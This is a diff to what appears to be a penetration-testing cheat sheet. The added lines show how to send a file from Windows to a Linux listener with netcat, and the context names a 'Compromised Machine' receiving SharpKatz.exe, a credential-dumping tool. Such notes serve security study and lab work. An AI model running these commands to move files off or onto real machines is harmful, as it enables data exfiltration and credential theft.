@@ -3,6 +3,15 @@
 nc -nv <IP> 21
 ```
 ## File Transfer with Netcat and Ncat
+#### From Windows to Linux
+**Windows**
+```cmd
+nc64.exe -w 3 10.10.15.11 8000 < file.txt
+```
+**Linux**
+```shell
+nc -l -p 8000 > file.txt
+```
 #### NetCat - Compromised Machine
 ```shell
 nc -l -p 8000 > SharpKatz.exe
